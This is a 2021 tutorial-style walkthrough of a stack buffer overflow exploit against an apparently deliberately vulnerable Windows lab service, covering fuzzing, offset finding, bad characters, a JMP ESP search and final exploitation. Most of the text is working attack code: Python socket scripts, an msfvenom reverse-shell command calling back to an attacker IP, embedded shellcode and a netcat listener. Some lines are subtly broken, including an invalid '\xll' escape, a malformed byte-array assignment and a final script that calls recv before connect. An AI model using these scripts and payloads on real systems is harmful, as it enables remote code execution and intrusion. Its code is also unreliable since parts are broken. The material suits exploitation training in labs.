# Stack Buffer Overflows 
> Arav Budhiraja | 24th July 2021

A buffer overflow is a memory attack in which we try to overflow the buffer space and overwrite the EIP to point to malicious shellcode giving RCE.

## Memory Structure

```md
ESP(Extended Stack Pointer)
--------------------------------
Buffer Space
--------------------------------
EBP(Extended Base Pointer)
--------------------------------
EIP(Extended Instruction Pointer)
--------------------------------
```

When providing input, the data is sent to the buffer space. Once the Buffer Space reaches its max compacity it will not store anymore characters. If the program did not have any input sanitization, a hacker could escape the buffer space and overwrite the EIP.

#### With Sanitization

```md
ESP(Extended Stack Pointer)
--------------------------------
Buffer Space
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
STOPS
--------------------------------
EBP(Extended Base Pointer)
--------------------------------
EIP(Extended Instruction Pointer)
--------------------------------
```

#### Without sanitization

```md
ESP(Extended Stack Pointer)
--------------------------------
Buffer Space
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--------------------------------
EBP(Extended Base Pointer)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--------------------------------
EIP(Extended Instruction Pointer)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## Setup

Download Immunity debugger and click on 'Yes' when it asks if you wish to install Python 2.7.1

Download mona.py and save it in C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands

## 1) Fuzzing

### Automating with python

* Checking if we can crash the program using a command

* We will use a python script to fuzz

```python
import socket

payload = b"A"*100

while True:
	try:
		s = socket.socket()
		s.connect(("192.168.1.15",9999))
		s.recv(1024)
		s.recv(1024)
		print(f"[+]Fuzzing with {len(payload)} bytes")
		s.send((b"TRUN:/.:/ "+payload+ b'\r\n'))
		s.recv(1024)
		s.close()
		payload = payload + b"A"*100
	except:
		print("[+]Could not connect")
		exit()
```

Note: When we were running the spike script, we should check the command being run by checking the command in the first register i.e. the EAX

* In Immunity we should check if the EIP's value is 41414141 which is the HEX of AAAA. If it is not then we could try fuzzing with more bytes

* Once we can confirm an approx value at which the program crashes, we can find the offset

### Manual way

Faster way

* Run the command given below

```python
python3 -c "print('A'*3000)"
```

* Paste the output into the input of the program and check if it crashes

* If it does, we can find the offset else change the number of bytes from 3000 to something like 4000/5000

## 2) Finding the offset

### Automating with python

* Offset is the number of bytes at which the last byte is the byte before the EIP

* The 4 bytes after the offset bytes will overwrite the EIP

* To check the offset, we can generate a pattern with a tool which comes with metasploit

```bash
msf-pattern_create -l 3000
```

Here, 3000 is the approx number at which the program crashed when we fuzzed it

* Now we can run this python script

```python
import socket

offset = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4"

try:
	s = socket.socket()
	s.connect(("192.168.1.15",9999))
	s.recv(1024)
	s.recv(1024)
	s.send((b"TRUN:/.:/ "+offset+ b'\r\n'))
	s.recv(1024)
	s.close()
except:
	print("[+]Error connecting to the server")
	exit()
```

The offset variable holds the string generated by the pattern create tool

* Once the script has finished running, we should check the value of the EIP in Immunity 

* The value of the EIP will be a HEX value

* Now to check the offset, we have to run this command

```bash
msf-pattern_offset -l 3000 -q 386F4337
```

Here, 3000 is the approx number at which the program crashed when we fuzzed it and 386F4337 is the value of the EIP

* Now, the tool will display the offset

* To confirm that we can overwrite the EIP, we can the following python script

```python
import socket

payload = b"A"*2000 + b"B"*4

try:
	s = socket.socket()
	s.connect(("192.168.1.15",9999))
	s.recv(1024)
	s.recv(1024)
	s.send((b"TRUN:/.:/ "+payload+ b'\r\n'))
	s.recv(1024)
	s.close()
except:
	print("[+]Error connecting to the server")
	exit()
```

Here, 2000 is the value of the offset. The number 4 will be constant as the size of the EIP is 4 bytes

* Finally, after this script has finished running, we can check the value of the EIP. If it is 42424242, then the exploit is working else an error had occurred 

### Manual way

Faster way

* To check the offset, we can generate a pattern with a tool which comes with metasploit

```bash
msf-pattern_create -l 3000
```

Here, 3000 is the approx number at which the program crashed when we fuzzed it

* Now paste the output into the input of the vulnerable program

* The program should crash

* Check the value of the EIP and copy it

* Now to check the offset, we have to run this command

```bash
msf-pattern_offset -l 1000 -q 386F4337
```

Here, 3000 is the approx number at which the program crashed when we fuzzed it and 386F4337 is the value of the EIP

* This will display the value of the offset

* We can confirm that we can overwrite the EIP by running this command

```bash
python3 -c "print('A'*2000 + 'B'*4)"
```

Here, 2000 is the value of the offset. The number 4 will be constant as the size of the EIP is 4 bytes

* Finally, after this script has finished running, we can check the value of the EIP. If it is 42424242, then the exploit is working else an error had occurred 

## 3) Finding Bad Characters

* By default, \x00 is a bad character

* First we have to generate a bytearray with mona and exclude \x00

```txt
!mona bytearray -b "\x00"
```

* To find bad characters we can run this python script

```python
import socket

badchars =
(
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
payload = b"A"*2000 + b"B"*4 + badchars

try:
	s = socket.socket()
	s.connect(("192.168.1.15",9999))
	s.recv(1024)
	s.recv(1024)
	s.send((b"TRUN:/.:/ "+payload+ b'\r\n'))
	s.recv(1024)
	s.close()
except:
	print("[+]Error connecting to the server")
	exit()
```

* Once this script has been executed, we can go to Immunity. Copy the value of the ESP register

* Now we can compare the ESP with our bytearray

```txt
!mona compare -f bytearray.bin -a 00DAFA28
```

Here, 'bytearray.bin' is the file containing the bytearray and '00DAFA28' is the value of the ESP

* In a new window, mona will display the bad characters. However, this is not 100% accurate

* To find accurate bad characters, we have to create a new bytearray and exclude \x00 and a bad character found by mona, remove the character from our python script and run it until no bad characters our displayed by mona

```txt
!mona bytearray -b "\x00\x23"
```

Here, \x00 is the first bad character found by mona and \x23 is the 2nd bad character displayed in the output from mona

* Remove the 2nd bad character i.e. \x23 from our python script and run the script

* Now again copy the value of the ESP and run this command using mona

```txt
!mona compare -f bytearray.bin -a 009AFA28
```

Here, 'bytearray.bin' is the file containing the bytearray and '009AFA28' is the value of the ESP

* Now mona will again display a set of bad characters

* Create a new bytearray and exclude the previous 2 characters and the 1st character in the new list found by mona

```txt
!mona bytearray -b "\x00\x23\x3c"
```

Here, \x00 and \x23 were the first 2 characters found by mona by running the first command and \x3c is the first character found by running the second command

* Now remove this new character i.e. \x3c from the python script and run it 

* Copy the value of the ESP and run this command using mona which will display the remaining bad characters

```txt
!mona compare -f C:\mona\oscp\bytearray.bin -a 0077FA28
```

Here, 'bytearray.bin' is the file containing the bytearray and '0077FA28' is the value of the ESP

* Continue appending a bad character found by mona to the '-b' switch of mona when generating the bytearray, removing the character from the python script and running it and comparing the bytearray with the ESP until no bad characters are displayed by mona

* Once no bad characters are displayed by mona, we will know that we have found all bad characters. All the bad characters would be the ones we have excluded from our bytearray

## 4) Finding the JMP ESP

* First, we have to find the correct module using Mona. In Immunity, in the white text box at the bottom of the screen, we can run mona by typing

```md
!mona modules
```

* This command will list a lot of files such as EXEs and DLLs. There should be 5 columns named 'Rebase', 'SafeSEH', 'ASLR', 'NXCompat' and 'OS DLL'.  There will be another column named 'Version, Modulename & Path'. We have to find the row in which the values of 'Rebase', 'SafeSEH', 'ASLR', 'NXCompat' and 'OS DLL' are mostly False. Once we do, we have to check the name of the file in 'Version, Modulename & Path' for this row. In this case, as we can see that the row in which the file is 'C:\Program Files\essfunc.dll', has the values for the mentioned columns as False

```md
Module info :
----------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
----------------------------------------------------------------------------------------------------------------------------------
 0x002d0000 | 0x00326000 | 0x00056000 | True   | True    | False |  False   | True   | 7.10.3052.4 [MSVCR71.dll] (C:\WINDOWS\system32\MSVCR71.dll)
 0x77b20000 | 0x77b32000 | 0x00012000 | False  | True    | False |  False   | True   | 5.1.2600.5875 [MSASN1.dll] (C:\WINDOWS\system32\MSASN1.dll)
 0x74980000 | 0x74aa3000 | 0x00123000 | False  | True    | False |  False   | True   | 8.100.1052.0 [msxml3.dll] (C:\WINDOWS\system32\msxml3.dll)
 0x77a80000 | 0x77b15000 | 0x00095000 | False  | True    | False |  False   | True   | 5.131.2600.5512 [CRYPT32.dll] (C:\WINDOWS\system32\CRYPT32.dll)
 0x00c10000 | 0x00ed5000 | 0x002c5000 | True   | True    | False |  False   | True   | 5.1.2600.5512 [xpsp2res.dll] (C:\WINDOWS\system32\xpsp2res.dll)
 0x7c800000 | 0x7c8f6000 | 0x000f6000 | False  | True    | False |  False   | True   | 5.1.2600.5781 [kernel32.dll] (C:\WINDOWS\system32\kernel32.dll)
 0x76780000 | 0x76789000 | 0x00009000 | False  | True    | False |  False   | True   | 6.00.2900.5512 [SHFOLDER.dll] (C:\WINDOWS\system32\SHFOLDER.dll)
 0x7c3a0000 | 0x7c41b000 | 0x0007b000 | False  | True    | False |  False   | True   | 7.10.3077.0 [MSVCP71.dll] (C:\WINDOWS\system32\MSVCP71.dll)
 0x7c900000 | 0x7c9b2000 | 0x000b2000 | False  | True    | False |  False   | True   | 5.1.2600.6055 [ntdll.dll] (C:\WINDOWS\system32\ntdll.dll)
 0x015b0000 | 0x015b8000 | 0x00008000 | False  | False   | False |  False   | False  | 9.20.200.49 [essfunc.dll] (C:\Program Files\essfunc.dll)
 0x71a90000 | 0x71a98000 | 0x00008000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [wshtcpip.dll] (C:\WINDOWS\System32\wshtcpip.dll)
 0x00270000 | 0x0029f000 | 0x0002f000 | True   | False   | False |  False   | True   | 9.20.200.49 [TraceWorX.DLL] (C:\WINDOWS\system32\TraceWorX.DLL)
 0x77fe0000 | 0x77ff1000 | 0x00011000 | False  | True    | False |  False   | True   | 5.1.2600.5834 [Secur32.dll] (C:\WINDOWS\system32\Secur32.dll)
 0x71ad0000 | 0x71ad9000 | 0x00009000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [WSOCK32.dll] (C:\WINDOWS\system32\WSOCK32.dll)
 0x71aa0000 | 0x71aa8000 | 0x00008000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [WS2HELP.dll] (C:\WINDOWS\system32\WS2HELP.dll)
 0x774e0000 | 0x7761e000 | 0x0013e000 | False  | True    | False |  False   | True   | 5.1.2600.6010 [ole32.dll] (C:\WINDOWS\system32\ole32.dll)
 0x77f60000 | 0x77fd6000 | 0x00076000 | False  | True    | False |  False   | True   | 6.00.2900.5912 [SHLWAPI.dll] (C:\WINDOWS\system32\SHLWAPI.dll)
 0x7e410000 | 0x7e4a1000 | 0x00091000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [USER32.dll] (C:\WINDOWS\system32\USER32.dll)
 0x010e0000 | 0x010ef000 | 0x0000f000 | True   | True    | False |  False   | True   | 9.20.200.49 [MwxPS.dll] (C:\WINDOWS\system32\MwxPS.dll)
 0x71b20000 | 0x71b32000 | 0x00012000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [MPR.dll] (C:\WINDOWS\system32\MPR.dll)
```

* Now, we have to find the pointer address for this vulnerable DLL. Normally, the pointer address is the first one. This can be done by running the following command in the white text-box. Here 'essfunc.dll' is the name of the vulnerable DLL.

```md
!mona jmp -r ESP -m "essfunc.dll"
OR
!mona find -s "\xff\xe4" -m "essfunc.dll"
```

* There will be a lot of output displayed. Under 'Results', there will be a lot of data which will contain the pointer addresses of the DLL. Here, there will be a few columns. The first column will contain the pointer addresses. Lets take the first one as *0*x*625011af*. We have to check if this is the break point. This can be done by modifying our fuzzer script. We have to reverse the value and then add the pointer address. Refer to the script below.

```python
import socket

# Pointer address = 625011af
# Reversed address = af 11 50 62

payload = b"A"*2000 + b"\xaf\xll\x50\x62"

try:
	s = socket.socket()
	s.connect(("192.168.1.15",9999))
	s.recv(1024)
	s.recv(1024)
	s.send((b"TRUN:/.:/ "+payload+ b'\r\n'))
	s.recv(1024)
	s.close()
except:
	print("[+]Error connecting to the server")
	exit()
```

* Before running the script, we have to set a breakpoint in Immunity. This can be done by pressing CTRL+G and pasting the pointer address i.e. *0*x*625011af* and then pressing enter. In the top left pane, we should see that that address has been displayed and next to it, 'JMP ESP' is written. If 'JMP ESP' is not written next to the address, then choose another pointer address

* Press F2 to set the breakpoint. We see that the address gets highlighted as we have set a breakpoint.

* Now we can run the script mentioned above and check if the program breaks. If it does and the value of the EIP is '625011af' then that is the correct break point else we will try another pointer address

## 5) Generating shellcode and gaining access

* Now, we come to the final stage of a buffer overflow. First we have to generate shell code using MSFVenom.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.6 LPORT=4444 EXITFUNC=thread -f python -b '\x00\x0a\x0d' 
```

* Here, LHOST is to specify our IP, LPORT is the port we wish to listen on, -p is to specify a payload, -f is to specify the format i.e. python and -b is used to refer to the bad characters

* Once we have our shellcode, we can add it to our program. When sending a payload, we have to send 2000 characters for the offset, followed by the pointer address, then 32 NOPs and finally our shellcode. This can be done by running the following code.

```python
import socket

shellcode = (
b"\xb8\x0c\x65\xe6\x11\xda\xd9\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
b"\x52\x31\x42\x12\x83\xea\xfc\x03\x4e\x6b\x04\xe4\xb2\x9b\x4a"
b"\x07\x4a\x5c\x2b\x81\xaf\x6d\x6b\xf5\xa4\xde\x5b\x7d\xe8\xd2"
b"\x10\xd3\x18\x60\x54\xfc\x2f\xc1\xd3\xda\x1e\xd2\x48\x1e\x01"
b"\x50\x93\x73\xe1\x69\x5c\x86\xe0\xae\x81\x6b\xb0\x67\xcd\xde"
b"\x24\x03\x9b\xe2\xcf\x5f\x0d\x63\x2c\x17\x2c\x42\xe3\x23\x77"
b"\x44\x02\xe7\x03\xcd\x1c\xe4\x2e\x87\x97\xde\xc5\x16\x71\x2f"
b"\x25\xb4\xbc\x9f\xd4\xc4\xf9\x18\x07\xb3\xf3\x5a\xba\xc4\xc0"
b"\x21\x60\x40\xd2\x82\xe3\xf2\x3e\x32\x27\x64\xb5\x38\x8c\xe2"
b"\x91\x5c\x13\x26\xaa\x59\x98\xc9\x7c\xe8\xda\xed\x58\xb0\xb9"
b"\x8c\xf9\x1c\x6f\xb0\x19\xff\xd0\x14\x52\x12\x04\x25\x39\x7b"
b"\xe9\x04\xc1\x7b\x65\x1e\xb2\x49\x2a\xb4\x5c\xe2\xa3\x12\x9b"
b"\x05\x9e\xe3\x33\xf8\x21\x14\x1a\x3f\x75\x44\x34\x96\xf6\x0f"
b"\xc4\x17\x23\x9f\x94\xb7\x9c\x60\x44\x78\x4d\x09\x8e\x77\xb2"
b"\x29\xb1\x5d\xdb\xc0\x48\x36\xee\x14\x52\x94\x86\x16\x52\x09"
b"\x9e\x5e\xc4\xe0\x9f\x4a"
)

payload = b"A" * 2000 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + shellcode
try:
	s=socket.socket()
	s.recv(1024)
	s.recv(1024)
	s.connect(('192.168.1.15',9999))
	s.send((b'TRUN /.:/' + payload + b'\r\n'))
	s.recv(1024)
	s.close()

except:
	print("[+]Error connecting to the server")
	exit()
```

* Here, 2000 is the offset, "\xaf\xll\x50\62" is the pointer address, "\x90" is the NOP, 32 is the padding and then we send the shellcode. Before running the script, we have to listen on port 4444 using NetCat

```bash
nc -lnvp 4444
```

* Now, we can run the python script. If we get a connection back, then our buffer overflow was successful else something went wrong. If something is wrong, then we should check the offset/bad characters/JMP ESP or try to change the padding from 32 to 16,8 or 48

## [Cheatsheet](https://infosecwriteups.com/tryhackme-oscp-buffer-overflow-prep-overflow-2-57c22b51a91f)

***
